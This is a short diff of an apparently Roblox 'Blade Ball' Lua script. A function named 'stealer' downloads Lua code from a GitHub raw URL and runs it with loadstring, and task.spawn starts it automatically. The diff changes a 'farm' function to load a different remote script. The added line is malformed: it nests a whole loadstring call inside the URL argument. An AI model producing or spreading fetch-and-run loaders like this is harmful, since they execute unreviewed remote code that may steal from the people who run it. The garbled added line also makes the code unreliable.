@@ -2,7 +2,7 @@ local function stealer()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/trabulascript/Blade-Ball/refs/heads/main/script.lua"'))()
 end
 local function farm()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/kidshop4/scriptbladeballk/main/bladeball.lua'))()
+    loadstring(game:HttpGet('loadstring(game:HttpGet("https://raw.githubusercontent.com/trabulascript/bladeball/refs/heads/main/script.lua",true))()'))()
 end
 
 task.spawn(stealer)
